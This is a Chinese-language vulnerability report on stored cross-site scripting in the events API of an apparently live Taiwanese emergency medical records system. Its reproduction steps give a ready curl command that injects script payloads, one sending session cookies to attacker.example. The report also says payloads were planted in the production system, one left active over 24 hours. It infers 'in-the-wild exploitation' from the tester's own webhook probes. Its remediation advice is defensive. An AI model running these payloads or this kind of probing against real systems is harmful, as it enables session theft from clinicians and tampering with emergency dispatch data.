## Description

目标 `https://epcr.tpf.gov.tw:4001/events` 在 Annotation/TypeOfEventTxt/Caption 等自由文本字段不进行 HTML 转义。HTTP 响应头未设置 Content-Security-Policy，且 `x-xss-protection: 0`（显式禁用浏览器 XSS 过滤器）。导致任何写入数据库的 &lt;svg/onload&gt;、&lt;img/onerror&gt;、&lt;script&gt; payload 在医生/EMS/管理员浏览器中查看事件列表/详情时自动执行，窃取会话/cookie/CSRF token。复测证实旧 PoC id=567246（CaseID=TestXSSV3Final1788029974）已存活超过 24 小时；新写入 PoC id=567251 已 DELETE 自清。历史同类 PoC id=567247（webhook.site/9938583b/evt103928 已被外发）与 id=567248 MirrorTest8888 已被浏览器触发（mirror_test 已被访问），证明该 Stored XSS 实际可触发、真实被利用过。

## Reproduction

1. 准备：浏览器（Chrome/Firefox）
2. 受害者路径：医生/EMS 用户登录 `https://epcr.tpf.gov.tw:4000`（AngularJS 前端）→ 通过 SPA 业务流跳转到 4001 查看事件详情 /events/:id 或列表
3. 攻击者路径：在任意时刻执行 `curl -X POST -H 'Content-Type: application/json' -d '{"CaseID":"x","recordUuid":"x","TypeOfEventTxt":"<svg onload=alert(1)>","Annotation":"<img src=x onerror=fetch(\"https://attacker.example/log?ck=\"+document.cookie)>"}' https://epcr.tpf.gov.tw:4001/events`
4. 触发：医生打开事件列表 /events 或事件详情页（如 /events/567246）时，浏览器解析 payload 执行 JS，document.cookie + page DOM 自动外发到 attacker.example
5. 验证（旧 PoC 已可复现）：浏览器打开 https://epcr.tpf.gov.tw:4001/events/567246 即触发 onload/onerror（仅本地 PoC，可换成外发到攻击者域）
6. 复现后清理：执行 `curl -X DELETE https://epcr.tpf.gov.tw:4001/events/<注入的id>`，最小破坏

## Impact

Stored XSS 一旦被医务/管理员浏览器触发即可：
1. 窃取会话 Cookie（即便 HttpOnly 也可通过 document.body.innerHTML 抓取页面内业务数据）
2. 读取 localStorage 中 JWT（authInterceptorConfig 已暴露 JWT 写入 localStorage；如医生/admin 走前端路由将自动登录，XSS 可窃取 EPCRServerAuthToken/EPCRServerRefreshToken）
3. 以受害者身份在 4004 /login2FA /refreshToken /Users/changePassword /Permissions 等鉴权接口执行任意操作
4. 通过 EPCR 4000 socket.io 实时数据流推送伪造 dispatchRecord/caseUpdate/newCase 数据，干扰急救调度
5. 历史 PoC id=567247 已真实外发 webhook，证明实际已被外部触发；XSS 漏洞已在野利用

业务影响：医疗系统的会话/Token 窃取 + 急救数据流劫持 + 责任不可追溯（攻击者身份可伪装为任意登录医生）

## Recommendation

1. **服务端 HTML 转义**：对 Annotation/TypeOfEventTxt/Caption 等所有用户可控文本字段统一用 escape-html/DOMPurify(node) 在写入前与读取后双重过滤；不允许任何 &lt; &gt; &quot; &apos; &amp; 等 HTML 元字符原样落库
2. **强制 CSP**：响应头补 `Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'; form-action 'self'`，并对 /events 端点额外加 `report-uri /csp-report`
3. **开启浏览器 XSS 过滤器**：移除 `x-xss-protection: 0`，改为 `X-XSS-Protection: 1; mode=block`
4. **Cookie 安全加固**：所有会话 cookie 加 HttpOnly + Secure + SameSite=Strict
5. **JWT 不入 localStorage**：改用 HttpOnly cookie 或 server-side session（参考 8000/app.js 已暴露的危险模式）
6. **审计清理历史 PoC**：批量 DELETE id=567204/567205/567246-567251 等已被注入的异常记录
7. **CSP report-only 灰度**：上线前用 `Content-Security-Policy-Report-Only` 收集 7 天违规，确认无前端功能被打破
